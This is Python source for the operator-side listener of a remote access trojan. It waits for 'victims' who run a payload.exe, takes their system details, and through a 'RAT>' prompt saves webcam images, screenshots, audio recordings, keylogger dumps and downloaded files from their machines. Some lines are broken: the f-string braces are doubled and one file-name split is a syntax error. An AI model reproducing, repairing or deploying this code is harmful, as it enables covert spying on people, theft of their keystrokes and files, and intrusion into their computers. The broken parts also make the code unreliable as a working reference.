import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    with open(filename, "wb") as f:
        f.write(base64.b64decode(content))

def start_listener():
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(5)
    print("[*] Waiting for victims... (Run payload.exe on targets)")
    
    while True:
        conn, addr = s.accept()
        print(f"\n[+] Connection from {{addr[0]}}")
        
        # Show initial system info
        try:
            sysinfo = json.loads(conn.recv(999999).decode())
            print("=== SYSTEM INFO ===")
            print(json.dumps(sysinfo, indent=4))
        except:
            print("[-] Could not receive system info")
        
        while True:
            cmd = input("RAT> ")
            if not cmd:
                continue
                
            conn.send(cmd.encode())
            
            if cmd.lower() == "exit":
                conn.close()
                break
                
            try:
                data = conn.recv(9999999).decode()
                
                if cmd == "webcam":
                    save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg")
                    print("[+] Webcam saved")
                elif cmd == "screenshot":
                    save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png")
                    print("[+] Screenshot saved")
                elif cmd == "record_audio":
                    save_file(data, f"audio_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.wav")
                    print("[+] Audio recording saved")
                elif cmd == "keylogger_dump":
                    logs = json.loads(data)
                    print("[+] Keylogs:")
                    for log in logs:
                        print(log)
                elif cmd.startswith("download "):
                    filename = input("Save as (press Enter for original name): ")
                    if not filename:
                        filename = cmd[9:].split("\")[-1]")
                    save_file(data, filename)
                    print(f"[+] Saved as {{filename}}")
                elif cmd.startswith("list_files "):
                    print("Files:", ", ".join(json.loads(data)))
                else:
                    print(data)
            except:
                print("[-] Connection lost")
                break

if __name__ == "__main__":
    start_listener()
